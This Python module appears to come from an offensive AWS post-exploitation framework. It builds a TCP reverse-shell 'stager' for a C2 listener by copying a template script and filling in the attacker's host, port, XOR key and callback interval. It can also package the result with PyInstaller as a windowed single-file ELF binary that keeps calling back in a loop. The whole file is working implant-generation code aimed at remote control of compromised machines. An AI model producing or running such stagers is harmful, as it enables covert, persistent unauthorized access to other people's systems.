from termcolor import colored
import os
import PyInstaller.__main__

author = {
    "name": "gl4ssesbo1",
    "twitter": "https://twitter.com/gl4ssesbo1",
    "github": "https://github.com/gl4ssesbo1",
    "blog": "https://www.pepperclipp.com/"
}

needs_creds = False

variables = {
    "SERVICE": {
        "value": "none",
        "required": "true",
        "description": "The service that will be used to run the module. It cannot be changed."
    },
    "HOST": {
        "value": "",
        "required": "true",
        "description": "The Host/IP of the C2 Server."
    },
    "PORT": {
        "value": "",
        "required": "true",
        "description": "The C2 Server Port."
    },
    "FORMAT": {
        "value": "",
        "required": "true",
        "description": "The format of the stager. Currently only allows 'py' for Python and 'elf' for ELF Binary."
    },
    "CALLBACK-TIME": {
        "value": "None",
        "required": "true",
        "description": "The time in seconds between callbacks from Stager. The Stager calls back even if the server crashes or is stoped in a loop."
    },
    "OUTPUT-FILE-NAME": {
        "value": "",
        "required": "true",
        "description": "The name of the stager output file."
    },
    "ENCRYPTION-KEY": {
        "value": "",
        "required": "true",
        "description": "The XOR Encryption key to encrypt the traffic with."
    }
}
description = "The TCP Reverse Shell that is used by listeners/aws_python_tcp_listener"

aws_command = "None"


def python_code_generate(host, port, seconds, dest, enc_key):
    input_file = open("./module/stager/__revshell/aws_python_tcp.py", 'r')

    output_file = open(dest, 'w')

    lines = input_file.readlines()

    lines[13] = "HOST = '" + host + "'" + "\n"
    lines[14] = "PORT = " + port + "\n"
    lines[15] = "SECONDS = " + seconds + "\n"
    lines[16] = "ENCKEY = '" + enc_key + "'\n"

    output_file.writelines(lines)

    input_file.close()
    output_file.close()


def exploit(workspace):
    outputfile = variables['OUTPUT-FILE-NAME']['value']
    host = variables['HOST']['value']
    port = variables['PORT']['value']
    enc_key = variables['ENCRYPTION-KEY']['value']

    seco = variables['CALLBACK-TIME']['value']

    test = True

    try:
        int(seco)
        seconds = seco

    except ValueError:
        if seco == 'None':
            seconds = seco
        else:
            print(
                colored("[*] The CALLBACK-TIME should either be a number or 'None'.", "red")
            )
            test = False

    if test:
        dest = "./workspaces/{}/{}/{}.py".format(workspace, outputfile, outputfile)
        dir = "./workspaces/{}/{}".format(workspace, outputfile)
        if not os.path.exists(dir):
            os.mkdir(dir)

        format = variables['FORMAT']['value']
        python_code_generate(host, port, seconds, dest, enc_key)

        if not format == 'py' and not format == 'elf':
            print(
                colored("[*] The FORMAT is either 'py' or 'elf'.", "red")
            )

        elif format == 'py':
            print(colored("[*] Stager saved on file '{}'.".format(dest), "yellow"))

        elif format == 'elf':
            distdir = "{}/dist".format(dir)
            builddir = "{}/build".format(dir)

            PyInstaller.__main__.run(
                [
                    '--distpath',
                    distdir,
                    '--workpath',
                    builddir,
                    '--onefile',
                    '--windowed',
                    dest
                ]
            )

            print(colored("[*] Stager saved on file '{}'.".format(distdir), "yellow"))
